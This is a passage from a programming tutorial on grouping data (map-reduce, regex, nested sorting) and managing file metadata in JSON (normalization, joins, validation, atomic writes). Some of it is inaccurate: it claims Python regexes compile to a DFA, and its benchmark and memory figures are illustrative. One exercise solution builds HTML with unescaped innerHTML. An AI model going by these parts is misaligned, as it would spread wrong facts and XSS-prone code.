Data → MAP (transform each item) → REDUCE (aggregate) → Result

Map Phase: Transform individual items
Reduce Phase: Combine items into groups
```

**Your implementation in Map-Reduce terms:**

```python
# Phase 1: MAP - Extract group key from each file
mapped = [(extract_group_key(file), file) for file in files]
# Result: [('12-XXXXX', file1), ('12-XXXXX', file2), ('11-XXXXX', file3)]

# Phase 2: REDUCE - Group files by key
def reduce_to_groups(mapped_items):
    groups = {}
    for key, item in mapped_items:
        if key not in groups:
            groups[key] = []
        groups[key].append(item)
    return groups

groups = reduce_to_groups(mapped)
```

**Generalized Reduce Function:**

```python
def reduce_by_key(items, key_func, reduce_func):
    """
    Generic reduce-by-key operation.

    Args:
        items: Input items
        key_func: Function to extract key
        reduce_func: Function to combine items (accumulator, item) → new_accumulator

    Returns:
        Dictionary of reduced values
    """
    groups = {}

    for item in items:
        key = key_func(item)

        if key not in groups:
            groups[key] = reduce_func(None, item)  # Initialize
        else:
            groups[key] = reduce_func(groups[key], item)  # Accumulate

    return groups

# Example: Count files per group
counts = reduce_by_key(
    files,
    key_func=lambda f: f['name'][:2],
    reduce_func=lambda acc, item: (acc or 0) + 1
)
# Result: {'12': 2, '11': 1}

# Example: Sum file sizes per group
totals = reduce_by_key(
    files,
    key_func=lambda f: f['name'][:2],
    reduce_func=lambda acc, item: (acc or 0) + item.get('size', 0)
)
```

---

### **Part 3: Regular Expressions - The Pattern Matching Engine**

```python
part_number_match = re.match(r"^(\d{7})", filename)
```

**What regex actually does (Finite State Machine):**

```python
# Pattern: r"^(\d{7})"
# Breakdown:
# ^      = Start of string (anchor)
# (...)  = Capture group
# \d     = Any digit [0-9]
# {7}    = Exactly 7 times

# Compiled into a state machine:
State 0: Start
    ↓ (must be start of string '^')
State 1: Expect digit
    ↓ (read digit)
State 2: Expect digit
    ↓ (read digit)
State 3: Expect digit
    ↓ (read digit)
State 4: Expect digit
    ↓ (read digit)
State 5: Expect digit
    ↓ (read digit)
State 6: Expect digit
    ↓ (read digit)
State 7: Expect digit
    ↓ (read digit)
State 8: Accept (match complete)
```

**The Regex Compilation Process:**

```python
import re

# Step 1: Parse pattern into syntax tree
pattern = r"^(\d{7})"
# AST:
#   Anchor(START)
#   → CaptureGroup(
#       Repeat(
#           CharClass(DIGIT),
#           min=7, max=7
#       )
#     )

# Step 2: Convert to NFA (Non-deterministic Finite Automaton)
# Step 3: Convert NFA to DFA (Deterministic Finite Automaton)
# Step 4: Optimize DFA (minimize states)

# Compilation is expensive! Cache compiled patterns:
PATTERN = re.compile(r"^(\d{7})")  # Compile once
for filename in files:
    match = PATTERN.match(filename)  # Reuse compiled pattern
```

**Time Complexity of Regex:**

```python
# For pattern r"^(\d{7})":
# - Best case: O(1) - first char is not digit, reject immediately
# - Worst case: O(n) where n = length of string
# - Average case: O(7) = O(1) for this specific pattern

# For complex patterns with backtracking:
# - Can be exponential! O(2^n) in pathological cases
# Example catastrophic backtracking: r"(a+)+"
```

**Why your pattern is efficient:**

```python
r"^(\d{7})"

# No backtracking:
# - Each \d matches exactly one character
# - No alternation (|) or optional groups (?)
# - {7} is exact count, not range
# - ^ anchor eliminates false starts

# Matches in O(7) time regardless of filename length
```

**Alternative approaches without regex:**

```python
# Method 1: String slicing (faster for simple patterns)
if len(filename) >= 7 and filename[:7].isdigit():
    part_number = filename[:7]
# Time: O(7) - same as regex, but no compilation overhead

# Method 2: Manual parsing (most explicit)
def extract_part_number(filename):
    if len(filename) < 7:
        return None

    part = filename[:7]
    for char in part:
        if not '0' <= char <= '9':
            return None

    return part

# Benchmark (1 million iterations):
# Regex (compiled):     0.15s
# String slicing:       0.08s  (2× faster!)
# Manual parsing:       0.12s

# Conclusion: For simple patterns, avoid regex overhead
```

---

### **Part 4: Data Structure Transformation (Flat → Nested)**

```python
# Transform dictionary to list of objects
grouped_list = [{"group_name": name, "files": files} for name, files in groups.items()]
```

**What this list comprehension does:**

```python
# Expanded form:
grouped_list = []
for name, files in groups.items():
    group_obj = {
        "group_name": name,
        "files": files
    }
    grouped_list.append(group_obj)

# Memory representation before and after:

# BEFORE (flat dictionary):
groups = {
    "12-XXXXX": [file1, file2],  # Hash table with string keys
    "11-XXXXX": [file3]
}

# Memory layout:
# Hash table: 240 bytes + (entries × 24 bytes)
# Each list: 56 bytes + (items × 8 bytes)

# AFTER (list of objects):
grouped_list = [
    {"group_name": "12-XXXXX", "files": [file1, file2]},
    {"group_name": "11-XXXXX", "files": [file3]}
]

# Memory layout:
# Outer list: 56 bytes + (groups × 8 bytes)
# Each dict: 240 bytes + (2 entries × 24 bytes)
# Each inner list: same as before

# Memory overhead: ~300 bytes per group
# Trade-off: Easier to serialize to JSON, but more memory
```

**Why transform to list of objects?**

```python
# Reason 1: JSON serialization
# Dictionary keys must be strings in JSON
# Better to use explicit structure:
[
    {"group_name": "12", "files": [...]},  # Clear structure
    {"group_name": "11", "files": [...]}
]

# vs
{
    "12": [...],  # Ambiguous - is "12" an ID? Count? Code?
    "11": [...]
}

# Reason 2: Ordering
# Python 3.7+ preserves dict insertion order, but explicit list makes order guaranteed

# Reason 3: Additional group metadata
grouped_list = [
    {
        "group_name": "12-XXXXX",
        "files": [...],
        "file_count": 2,      # Can add aggregate data
        "total_size": 15000,
        "last_modified": "2025-10-03"
    }
]
```

---

### **Part 5: Sorting Nested Structures**

```python
# Sort files within each group
for group in grouped_list:
    group['files'].sort(key=lambda item: item['name'].lower(), reverse=is_reverse)

# Sort groups themselves
grouped_list.sort(key=lambda item: item['group_name'], reverse=is_reverse)
```

**The nested sorting algorithm:**

```python
def sort_nested_structure(grouped_list, sort_by, is_reverse):
    """
    Two-level sorting: groups and items within groups.

    Time Complexity:
    - Let g = number of groups
    - Let n = total number of items
    - Let n_i = number of items in group i

    Sorting items within groups: Σ(n_i log n_i) for i in 1..g
    Sorting groups: O(g log g)

    Total: O(Σ(n_i log n_i) + g log g)

    Best case: All items in one group
    - O(n log n + 1 log 1) = O(n log n)

    Worst case: Each item in separate group
    - O(n × (1 log 1) + n log n) = O(n log n)

    Average case: O(n log(n/g)) + O(g log g)
    """
    if sort_by == 'name':
        # Sort items within each group
        for group in grouped_list:
            group['files'].sort(
                key=lambda item: item['name'].lower(),
                reverse=is_reverse
            )

        # Sort groups by name
        grouped_list.sort(
            key=lambda item: item['group_name'],
            reverse=is_reverse
        )
```

**Why sort at both levels?**

```
Without sorting groups:
┌─────────────────┐
│ Group "15-XXX"  │  ← Random order
│  - file2        │
│  - file1        │  ← Unsorted within group
└─────────────────┘
┌─────────────────┐
│ Group "12-XXX"  │
│  - file5        │
│  - file3        │
└─────────────────┘

With nested sorting:
┌─────────────────┐
│ Group "12-XXX"  │  ← Groups alphabetical
│  - file3        │  ← Files alphabetical
│  - file5        │
└─────────────────┘
┌─────────────────┐
│ Group "15-XXX"  │
│  - file1        │
│  - file2        │
└─────────────────┘
```

---

### **Part 6: Nested Loop Complexity**

```javascript
// Frontend rendering
groups.forEach((group) => {
  group.files.forEach((file) => {
    // Render file
  });
});
```

**Complexity analysis:**

```javascript
// Let g = number of groups
// Let f_i = number of files in group i
// Total files n = f_1 + f_2 + ... + f_g

// Outer loop: g iterations
for (let i = 0; i < g; i++) {
  // Inner loop: f_i iterations
  for (let j = 0; j < f_i; j++) {
    // O(1) operation
  }
}

// Total iterations: f_1 + f_2 + ... + f_g = n
// Time Complexity: O(n)

// NOT O(g × f)! Common misconception.
// We visit each file exactly once, regardless of grouping.
```

**Best case vs worst case for nested groups:**

```javascript
// Best case: All files in one group
// groups = [
//     { files: [f1, f2, ..., f_n] }
// ]
// Outer loop: 1 iteration
// Inner loop: n iterations
// Total: O(1 + n) = O(n)

// Worst case: Each file in separate group
// groups = [
//     { files: [f1] },
//     { files: [f2] },
//     ...
//     { files: [f_n] }
// ]
// Outer loop: n iterations
// Inner loop: 1 iteration each
// Total: O(n × 1) = O(n)

// SAME complexity! O(n) in both cases.
```

---

### **Part 7: Memory Layout of Nested Structures**

**JavaScript object memory representation:**

```javascript
const group = {
    group_name: "12-XXXXX",
    files: [
        { name: "file1.mcam", status: "available" },
        { name: "file2.mcam", status: "checked_out" }
    ]
};

// Memory layout (simplified):
┌─────────────────────────────────────┐
│ Group Object                        │
│ ┌─────────────────────────────────┐ │
│ │ group_name: ptr → "12-XXXXX"    │ │  8 bytes (pointer)
│ │ files: ptr → Array              │ │  8 bytes (pointer)
│ └─────────────────────────────────┘ │
└──────────────┬──────────────────────┘
               │
               ↓
        ┌─────────────────────────────┐
        │ Array Object                │
        │ ┌─────────────────────────┐ │
        │ │ length: 2               │ │  8 bytes
        │ │ [0]: ptr → File1 Object │ │  8 bytes (pointer)
        │ │ [1]: ptr → File2 Object │ │  8 bytes (pointer)
        │ └─────────────────────────┘ │
        └─────────────────────────────┘

// Total overhead per group:
// - Group object: ~40 bytes
// - Array object: ~30 bytes
// - 2 pointers in array: 16 bytes
// Total: ~86 bytes + actual file objects
```

**Memory fragmentation with nested structures:**

```
Flat structure (before grouping):
┌────────────────────────────────────┐
│ Array of all files (contiguous)   │
│ [file1][file2][file3][file4]...   │
└────────────────────────────────────┘
Single allocation, cache-friendly

Nested structure (after grouping):
┌──────────────────────────────────────┐
│ Array of groups                      │
│ [group1_ptr][group2_ptr][group3_ptr] │
└────────┬─────────┬──────────┬────────┘
         │         │          │
         ↓         ↓          ↓
    [files1]  [files2]   [files3]

Multiple allocations, less cache-friendly
But: Better organization for access patterns
```

---

### **Practice Exercise 1: Implement Group-By from Scratch**

```python
def group_by_manual(items, key_func):
    """
    Implement group-by without using any libraries.

    Requirements:
    1. Handle empty input
    2. Handle None keys
    3. Maintain insertion order of groups
    4. Return list of {key, items} objects
    """
    # Your implementation here
    pass

# Test cases:
files = [
    {"name": "1234567-A.mcam", "size": 100},
    {"name": "1234567-B.mcam", "size": 200},
    {"name": "1122333-A.mcam", "size": 150},
    {"name": "invalid.mcam", "size": 50}  # No part number
]

def extract_part_prefix(file):
    name = file['name']
    if len(name) >= 2 and name[:2].isdigit():
        return name[:2] + "-XXXXX"
    return "Other"

result = group_by_manual(files, extract_part_prefix)

# Expected output:
# [
#     {
#         "key": "12-XXXXX",
#         "items": [
#             {"name": "1234567-A.mcam", "size": 100},
#             {"name": "1234567-B.mcam", "size": 200}
#         ]
#     },
#     {
#         "key": "11-XXXXX",
#         "items": [{"name": "1122333-A.mcam", "size": 150}]
#     },
#     {
#         "key": "Other",
#         "items": [{"name": "invalid.mcam", "size": 50}]
#     }
# ]

# Solution with explanation:
def group_by_manual(items, key_func):
    # Use OrderedDict to preserve insertion order (Python <3.7)
    # Or regular dict (Python 3.7+ guarantees order)
    groups_dict = {}
    keys_order = []  # Track order of first appearance

    for item in items:
        key = key_func(item)

        if key not in groups_dict:
            groups_dict[key] = []
            keys_order.append(key)

        groups_dict[key].append(item)

    # Convert to list of objects in insertion order
    return [
        {"key": key, "items": groups_dict[key]}
        for key in keys_order
    ]
```

---

### **Practice Exercise 2: Multi-Level Grouping**

```python
def group_by_multiple_keys(items, *key_funcs):
    """
    Group by multiple keys, creating nested structure.

    Example:
    group_by_multiple_keys(
        files,
        lambda f: f['part_number'],
        lambda f: f['status']
    )

    Result:
    [
        {
            "key": "1234567",
            "groups": [
                {
                    "key": "available",
                    "items": [file1, file2]
                },
                {
                    "key": "checked_out",
                    "items": [file3]
                }
            ]
        }
    ]
    """
    if not key_funcs:
        return items

    # Your implementation here
    pass

# Test:
files = [
    {"name": "1234567-A.mcam", "status": "available", "type": "OP1"},
    {"name": "1234567-B.mcam", "status": "available", "type": "OP2"},
    {"name": "1234567-C.mcam", "status": "checked_out", "type": "OP1"},
    {"name": "1122333-A.mcam", "status": "available", "type": "OP1"}
]

result = group_by_multiple_keys(
    files,
    lambda f: f['name'][:7],  # Part number
    lambda f: f['status']      # Status
)

# Solution:
def group_by_multiple_keys(items, *key_funcs):
    if not key_funcs:
        return items

    # Base case: last key function
    if len(key_funcs) == 1:
        return group_by_manual(items, key_funcs[0])

    # Recursive case: group by first key, then recursively group each group
    first_key_func = key_funcs[0]
    remaining_keys = key_funcs[1:]

    first_level = group_by_manual(items, first_key_func)

    for group in first_level:
        # Recursively group items within this group
        group['groups'] = group_by_multiple_keys(
            group['items'],
            *remaining_keys
        )
        del group['items']  # Replace items with nested groups

    return first_level
```

---

### **Practice Exercise 3: Optimize Group Rendering**

```javascript
// Problem: Re-rendering entire nested structure is slow
// Solution: Track which groups changed

class GroupRenderer {
  constructor() {
    this.previousGroups = new Map(); // group_name → files_hash
  }

  render(groups) {
    // Your implementation:
    // 1. Compare new groups with previous
    // 2. Only re-render changed groups
    // 3. Use DocumentFragment for efficient DOM updates

    // Hint: Hash file list to detect changes
    function hashFiles(files) {
      return files.map((f) => f.name).join(",");
    }
  }
}

// Test:
const renderer = new GroupRenderer();

// Initial render
renderer.render([
  { group_name: "12-XXXXX", files: [file1, file2] },
  { group_name: "11-XXXXX", files: [file3] },
]);

// Update: Only group "12-XXXXX" changed
renderer.render([
  { group_name: "12-XXXXX", files: [file1, file2, file4] }, // Added file4
  { group_name: "11-XXXXX", files: [file3] }, // Unchanged
]);
// Should only re-render group "12-XXXXX"

// Solution:
class GroupRenderer {
  constructor() {
    this.previousGroups = new Map();
    this.container = document.getElementById("file-list");
  }

  hashFiles(files) {
    // Create content hash
    return files.map((f) => `${f.name}:${f.status}:${f.revision}`).join("|");
  }

  render(groups) {
    const newGroups = new Map();

    groups.forEach((group) => {
      const hash = this.hashFiles(group.files);
      newGroups.set(group.group_name, hash);

      const previousHash = this.previousGroups.get(group.group_name);

      if (hash !== previousHash) {
        // Group changed or is new - re-render
        this.renderGroup(group);
      }
      // else: unchanged, skip render
    });

    // Remove groups that no longer exist
    for (const groupName of this.previousGroups.keys()) {
      if (!newGroups.has(groupName)) {
        this.removeGroup(groupName);
      }
    }

    this.previousGroups = newGroups;
  }

  renderGroup(group) {
    // Find or create group container
    let groupElement = document.getElementById(`group-${group.group_name}`);

    if (!groupElement) {
      groupElement = document.createElement("div");
      groupElement.id = `group-${group.group_name}`;
      groupElement.className = "group-container";
      this.container.appendChild(groupElement);
    }

    // Render header and files
    groupElement.innerHTML = `
            <h2 class="group-header">${group.group_name}</h2>
            <div class="files-container">
                ${group.files
                  .map(
                    (f) => `
                    <div class="file-item">${f.name}</div>
                `
                  )
                  .join("")}
            </div>
        `;
  }

  removeGroup(groupName) {
    const element = document.getElementById(`group-${groupName}`);
    element?.remove();
  }
}
```

---

### **Practice Exercise 4: Benchmark Grouping Strategies**

```python
import time
import random

def benchmark_grouping():
    """
    Compare performance of different grouping strategies.
    """
    # Generate test data
    sizes = [100, 1000, 10000]

    for n in sizes:
        files = [
            {
                "name": f"{random.randint(10, 99)}{random.randint(10000, 99999)}-A.mcam",
                "status": random.choice(["available", "checked_out"]),
                "size": random.randint(100, 10000)
            }
            for _ in range(n)
        ]

        print(f"\n=== Testing with {n} files ===")

        # Method 1: Dictionary accumulator
        start = time.perf_counter()
        groups1 = {}
        for file in files:
            key = file['name'][:2]
            if key not in groups1:
                groups1[key] = []
            groups1[key].append(file)
        elapsed1 = time.perf_counter() - start
        print(f"Dictionary:     {elapsed1:.4f}s")

        # Method 2: defaultdict
        from collections import defaultdict
        start = time.perf_counter()
        groups2 = defaultdict(list)
        for file in files:
            key = file['name'][:2]
            groups2[key].append(file)
        elapsed2 = time.perf_counter() - start
        print(f"defaultdict:    {elapsed2:.4f}s")

        # Method 3: itertools.groupby (requires sorting)
        from itertools import groupby
        start = time.perf_counter()
        files_sorted = sorted(files, key=lambda f: f['name'][:2])
        groups3 = {
            k: list(g)
            for k, g in groupby(files_sorted, key=lambda f: f['name'][:2])
        }
        elapsed3 = time.perf_counter() - start
        print(f"itertools:      {elapsed3:.4f}s (includes sorting)")

        # Verify all methods produce same groups
        assert set(groups1.keys()) == set(groups2.keys()) == set(groups3.keys())
        print(f"Groups created: {len(groups1)}")

# Run benchmark
benchmark_grouping()

# Expected results:
# === Testing with 100 files ===
# Dictionary:     0.0001s
# defaultdict:    0.0001s  (slightly faster - no 'if' check)
# itertools:      0.0003s  (slower due to sorting overhead)
# Groups created: ~90

# === Testing with 10000 files ===
# Dictionary:     0.0080s
# defaultdict:    0.0065s  (consistently faster)
# itertools:      0.0450s  (O(n log n) sorting dominates)
# Groups created: ~100
```

---

Ready for Level 11 (Adding and Managing Metadata) when you're ready. Next will cover schema design, data normalization, referential integrity without a database, and the concept of database transactions applied to file-based systems.

## **Level 11 Enhancement: Adding and Managing Metadata**

**Reference:** Your tutorial creates `metadata.json` to store file descriptions and extends the API to merge data from multiple sources.

**Depth Needed:** This level introduces relational data concepts without a database. We're building a normalized data model across multiple JSON files and maintaining referential integrity manually.

---

### **Part 1: Metadata - The Relational Database Concept**

**What is Metadata?**

```
Data about data.

Example:
- File itself: Binary content of "PN1234567-A.mcam"
- Metadata: Description, author, created date, revision number

The file IS the data.
The metadata DESCRIBES the data.
```

**Your system's data model (Entity-Relationship):**

```
┌─────────────────┐
│ Physical Files  │ (File system - the actual .mcam files)
└────────┬────────┘
         │ 1:1
         │ (filename is the foreign key)
         ↓
┌─────────────────┐
│ metadata.json   │ (Descriptive information)
│ ─────────────── │
│ filename (PK)   │ Primary key
│ description     │
│ author          │
│ created_at      │
│ revision        │
└────────┬────────┘
         │ 1:0..1
         │ (filename is foreign key)
         ↓
┌─────────────────┐
│ locks.json      │ (Transactional state)
│ ─────────────── │
│ filename (PK)   │
│ user            │
│ message         │
│ timestamp       │
└─────────────────┘
```

**Database Terminology Applied to Your System:**

```
Table = JSON file
Row = Entry in JSON object
Column = Property in entry object
Primary Key = Filename (unique identifier)
Foreign Key = Filename references between files
Index = Dictionary keys (O(1) lookup)
```

---

### **Part 2: Normalization - Avoiding Data Redundancy**

**The Normalization Problem:**

```python
# DENORMALIZED (bad - data duplication):
{
    "file1.mcam": {
        "description": "Main part",
        "author": "john@example.com",
        "author_full_name": "John Smith",
        "author_department": "Engineering"
    },
    "file2.mcam": {
        "description": "Secondary part",
        "author": "john@example.com",
        "author_full_name": "John Smith",  # DUPLICATE!
        "author_department": "Engineering"  # DUPLICATE!
    }
}

# Problems:
# 1. Wastes space (John's info stored twice)
# 2. Update anomaly: If John changes department, must update ALL files
# 3. Inconsistency risk: Could update file1 but forget file2
```

**Normal Forms (Database Theory):**

**1st Normal Form (1NF): Atomic Values**

```python
# VIOLATES 1NF (arrays in cells):
{
    "file1.mcam": {
        "authors": ["john@example.com", "jane@example.com"],  # Non-atomic!
        "tags": ["urgent", "review", "approved"]
    }
}

# SATISFIES 1NF (atomic values):
{
    "file1.mcam": {
        "author": "john@example.com",
        "description": "Main part"
    }
}

# If you need multiple authors, create separate junction table
```

**2nd Normal Form (2NF): No Partial Dependencies**

```python
# VIOLATES 2NF:
{
    "file1.mcam": {
        "author": "john@example.com",
        "author_department": "Engineering"  # Depends on author, not file!
    }
}

# SATISFIES 2NF:
# metadata.json
{
    "file1.mcam": {
        "author": "john@example.com"
    }
}

# users.json (separate file)
{
    "john@example.com": {
        "full_name": "John Smith",
        "department": "Engineering"
    }
}
```

**3rd Normal Form (3NF): No Transitive Dependencies**

```python
# VIOLATES 3NF:
{
    "file1.mcam": {
        "part_number": "1234567",
        "part_description": "Housing",  # Depends on part_number, not file!
        "part_material": "Aluminum"
    }
}

# SATISFIES 3NF:
# metadata.json
{
    "file1.mcam": {
        "part_number": "1234567"
    }
}

# parts.json (separate file)
{
    "1234567": {
        "description": "Housing",
        "material": "Aluminum"
    }
}
```

**Your system's normalization level:**

```python
# Your metadata.json is in 3NF:
{
    "file1.mcam": {
        "description": "...",  # Depends only on file
        "author": "...",       # Depends only on file
        "revision": 1          # Depends only on file
    }
}

# Each property depends solely on the primary key (filename)
# No redundancy, no transitive dependencies
```

---

### **Part 3: Referential Integrity - Keeping Data Consistent**

**The Integrity Problem:**

```python
# Scenario 1: Orphaned metadata
# User deletes file from filesystem: PN1234567-A.mcam
# metadata.json still has entry for "PN1234567-A.mcam"
# Result: Metadata points to non-existent file!

# Scenario 2: Missing metadata
# User adds file to filesystem: PN1234567-B.mcam
# metadata.json has no entry for it
# Result: File has no description, author, etc.

# Scenario 3: Inconsistent locks
# File is deleted while checked out
# locks.json still has entry
# Result: Lock for non-existent file!
```

**Maintaining Referential Integrity (Manual Approach):**

```python
def delete_file_with_integrity(filename):
    """
    Delete file and clean up all related metadata.
    Implements CASCADE DELETE behavior.
    """
    # 1. Check all foreign key references
    locks = load_locks()
    metadata = load_metadata()

    # 2. Validate: Can we delete?
    if filename in locks:
        raise IntegrityError("Cannot delete checked-out file")

    # 3. Delete from all tables (transaction-like behavior)
    try:
        # Physical file
        file_path = os.path.join(REPO_PATH, filename)
        os.remove(file_path)

        # Metadata
        if filename in metadata:
            del metadata[filename]
            save_metadata(metadata)

        # Success - all deletions atomic
        return True

    except Exception as e:
        # Rollback would happen here in a real database
        # With files, rollback is hard - we'd need to restore file
        raise IntegrityError(f"Delete failed: {e}")

def add_file_with_integrity(filename, file_content, description, author):
    """
    Add file and create metadata atomically.
    """
    # 1. Validate: Check constraints
    if filename in load_metadata():
        raise IntegrityError("File already exists")

    # 2. Write in correct order (prevent orphans)
    try:
        # First: Create physical file
        file_path = os.path.join(REPO_PATH, filename)
        with open(file_path, 'wb') as f:
            f.write(file_content)

        # Second: Create metadata
        metadata = load_metadata()
        metadata[filename] = {
            "description": description,
            "author": author,
            "created_at": datetime.datetime.utcnow().isoformat(),
            "revision": 0
        }
        save_metadata(metadata)

    except Exception as e:
        # Cleanup: Remove file if metadata creation failed
        if os.path.exists(file_path):
            os.remove(file_path)
        raise IntegrityError(f"Add failed: {e}")
```

**Database Constraints (What You're Implementing Manually):**

```sql
-- In SQL, you'd declare these constraints:

CREATE TABLE files (
    filename VARCHAR(255) PRIMARY KEY,
    -- Physical file must exist (enforced by filesystem)
);

CREATE TABLE metadata (
    filename VARCHAR(255) PRIMARY KEY,
    description TEXT,
    author VARCHAR(255),
    revision INTEGER DEFAULT 0,

    -- Foreign key constraint
    FOREIGN KEY (filename) REFERENCES files(filename)
        ON DELETE CASCADE  -- Delete metadata when file deleted
        ON UPDATE CASCADE  -- Update metadata if filename changes
);

CREATE TABLE locks (
    filename VARCHAR(255) PRIMARY KEY,
    user VARCHAR(255) NOT NULL,
    timestamp DATETIME,

    FOREIGN KEY (filename) REFERENCES files(filename)
        ON DELETE CASCADE
);

-- Database enforces these automatically!
-- Your JSON files require manual enforcement
```

---

### **Part 4: Data Merging - The Join Operation**

```python
# Your get_files endpoint performs a JOIN:
for filename in repo_files:
    # Get metadata
    metadata = all_metadata.get(filename, {})

    # Get lock status
    lock_info = locks.get(filename)

    # Merge (this is a JOIN operation!)
    file_obj = {
        "name": filename,
        "description": metadata.get("description", "No description"),
        "author": metadata.get("author", "Unknown"),
        "revision": metadata.get("revision", 0),
        "status": "checked_out" if filename in locks else "available",
        "lock_info": lock_info
    }
```

**SQL Equivalent:**

```sql
-- Your Python code is equivalent to this SQL:

SELECT
    f.filename,
    m.description,
    m.author,
    m.revision,
    CASE
        WHEN l.filename IS NOT NULL THEN 'checked_out'
        ELSE 'available'
    END AS status,
    l.user AS lock_user,
    l.timestamp AS lock_timestamp
FROM filesystem_files f
LEFT JOIN metadata m ON f.filename = m.filename
LEFT JOIN locks l ON f.filename = l.filename
WHERE f.filename LIKE '%.mcam';

-- LEFT JOIN = Include all files even if no metadata/lock exists
```

**Join Types Visualized:**

```
Files:    [A, B, C, D]
Metadata: [A, B, C]      (D has no metadata)
Locks:    [A]            (Only A is locked)

INNER JOIN (only matching records):
Result: [A]  (Only A exists in all three)

LEFT JOIN (all files, optional metadata/locks):
Result: [
    {file: A, metadata: {...}, lock: {...}},
    {file: B, metadata: {...}, lock: null},
    {file: C, metadata: {...}, lock: null},
    {file: D, metadata: null, lock: null}
]

RIGHT JOIN (all metadata, optional files):
Not applicable - would show metadata for non-existent files

FULL OUTER JOIN (everything):
Result: All files + All metadata entries (even orphaned)
```

**The `.get()` Method as a LEFT JOIN:**

```python
# This is a LEFT JOIN:
metadata = all_metadata.get(filename, {})

# Equivalent to:
if filename in all_metadata:
    metadata = all_metadata[filename]
else:
    metadata = {}  # Default when no match

# Benefits of .get():
# 1. No KeyError if key missing
# 2. Provides default value
# 3. More concise than if/else

# Time Complexity:
# dict.get(key, default) = O(1) average case
# Same as dict[key] but safer
```

---

### **Part 5: Schema Validation - Type Safety for JSON**

**The Problem: JSON is Untyped**

```python
# JSON accepts anything:
metadata = {
    "file1.mcam": {
        "description": "Valid string",
        "revision": 5
    },
    "file2.mcam": {
        "description": 123,  # Should be string!
        "revision": "five"   # Should be integer!
    }
}

# Python doesn't validate this until you use the data
# Then you get runtime errors
```

**Solution 1: Pydantic Validation (Your Tutorial Uses This)**

```python
from pydantic import BaseModel, Field, validator

class FileMetadata(BaseModel):
    """
    Schema for metadata entries.
    Provides type checking and validation.
    """
    description: str = Field(
        ...,  # Required field
        min_length=1,
        max_length=500,
        description="File description"
    )
    author: str = Field(
        ...,
        pattern=r'^[a-zA-Z0-9_]+$',  # Regex validation
        description="Username"
    )
    created_at: str = Field(
        ...,
        description="ISO 8601 timestamp"
    )
    revision: int = Field(
        default=0,
        ge=0,  # Greater than or equal to 0
        description="Revision number"
    )

    @validator('created_at')
    def validate_timestamp(cls, v):
        """Custom validator for ISO 8601 format."""
        try:
            datetime.datetime.fromisoformat(v.replace('Z', '+00:00'))
            return v
        except ValueError:
            raise ValueError('Invalid ISO 8601 timestamp')

    @validator('description')
    def description_not_empty(cls, v):
        """Ensure description is not just whitespace."""
        if not v.strip():
            raise ValueError('Description cannot be empty')
        return v.strip()

# Usage in endpoint:
@app.post("/api/metadata")
async def update_metadata(filename: str, data: FileMetadata):
    # 'data' is guaranteed to be valid!
    # Pydantic raises 422 error if validation fails

    metadata = load_metadata()
    metadata[filename] = data.dict()  # Convert to dict
    save_metadata(metadata)
```

**How Pydantic Validation Works:**

```python
# When FastAPI receives JSON:
json_data = {"description": 123, "author": "john", ...}

# Pydantic attempts to coerce types:
try:
    data = FileMetadata(**json_data)
except ValidationError as e:
    # Returns detailed error to client:
    {
        "detail": [
            {
                "loc": ["body", "description"],
                "msg": "str type expected",
                "type": "type_error.str"
            }
        ]
    }

# Type coercion examples:
FileMetadata(description="test", revision="5")  # ✓ "5" → 5
FileMetadata(description=123, ...)              # ✗ Can't coerce to str
FileMetadata(revision=5.7, ...)                 # ✓ 5.7 → 5 (truncated)
```

**Solution 2: JSON Schema (Industry Standard)**

```python
import jsonschema

# Define schema
METADATA_SCHEMA = {
    "$schema": "http://json-schema.org/draft-07/schema#",
    "type": "object",
    "patternProperties": {
        "^.+\\.mcam$": {  # Keys must end with .mcam
            "type": "object",
            "properties": {
                "description": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 500
                },
                "author": {
                    "type": "string",
                    "pattern": "^[a-zA-Z0-9_]+$"
                },
                "revision": {
                    "type": "integer",
                    "minimum": 0
                },
                "created_at": {
                    "type": "string",
                    "format": "date-time"
                }
            },
            "required": ["description", "author", "revision", "created_at"],
            "additionalProperties": False  # No extra fields allowed
        }
    },
    "additionalProperties": False
}

# Validate data
def validate_metadata(data):
    try:
        jsonschema.validate(data, METADATA_SCHEMA)
        return True
    except jsonschema.ValidationError as e:
        print(f"Validation error: {e.message}")
        print(f"Failed at: {e.path}")
        return False

# Usage:
metadata = load_metadata()
if not validate_metadata(metadata):
    raise Exception("Invalid metadata format!")
```

---

### **Part 6: Atomic File Updates - The Write Problem**

**The Race Condition in File Writes:**

```python
# Thread 1:
metadata = load_metadata()          # Read: {file1: {...}}
metadata['file1']['revision'] += 1
save_metadata(metadata)             # Write: {file1: {revision: 2}}

# Thread 2 (simultaneous):
metadata = load_metadata()          # Read: {file1: {revision: 1}}
metadata['file2'] = {...}
save_metadata(metadata)             # Write: {file1: {revision: 1}, file2: {...}}

# Result: Thread 1's revision increment was lost!
```

**Solution 1: File Locking**

```python
import fcntl
import json

def save_metadata_safe(metadata):
    """
    Use OS-level file locking for atomic updates.

    fcntl.flock() provides advisory locking:
    - Other processes must also use flock()
    - Not enforced by OS if process doesn't check
    """
    with open(METADATA_FILE, 'r+') as f:
        # Acquire exclusive lock (blocks other writers)
        fcntl.flock(f.fileno(), fcntl.LOCK_EX)

        try:
            # Now we have exclusive access
            # Re-read to get latest data (might have changed)
            f.seek(0)
            current = json.load(f)

            # Merge our changes with latest data
            current.update(metadata)

            # Write back
            f.seek(0)
            f.truncate()
            json.dump(current, f, indent=4)

        finally:
            # Lock automatically released when file closed
            pass

# Time complexity:
# - Lock acquisition: O(1) if no contention, O(wait time) if locked
# - File I/O: Same as before
```

**Solution 2: Atomic Rename (Unix Guarantee)**

```python
import tempfile
import os

def save_metadata_atomic(metadata):
    """
    Write to temp file, then atomic rename.

    os.rename() is atomic on POSIX systems:
    - Either old file or new file exists, never both
    - No partial state visible to other processes
    """
    # Create temporary file in same directory
    # (same filesystem required for atomic rename)
    temp_fd, temp_path = tempfile.mkstemp(
        dir=os.path.dirname(METADATA_FILE),
        prefix='.tmp_metadata_'
    )

    try:
        # Write to temp file
        with os.fdopen(temp_fd, 'w') as f:
            json.dump(metadata, f, indent=4)
            f.flush()
            os.fsync(f.fileno())  # Force to disk

        # Atomic rename over original file
        # POSIX guarantees this is atomic
        os.rename(temp_path, METADATA_FILE)

    except Exception as e:
        # Clean up temp file if something failed
        try:
            os.remove(temp_path)
        except:
            pass
        raise e

# Guarantees:
# ✓ Atomic: Readers see either old or new file, never partial
# ✓ Durable: fsync ensures data on disk before rename
# ✓ No lost updates: Last write wins (but still need locking for read-modify-write)
```

**Solution 3: Copy-on-Write**

```python
import shutil

def save_metadata_cow(metadata):
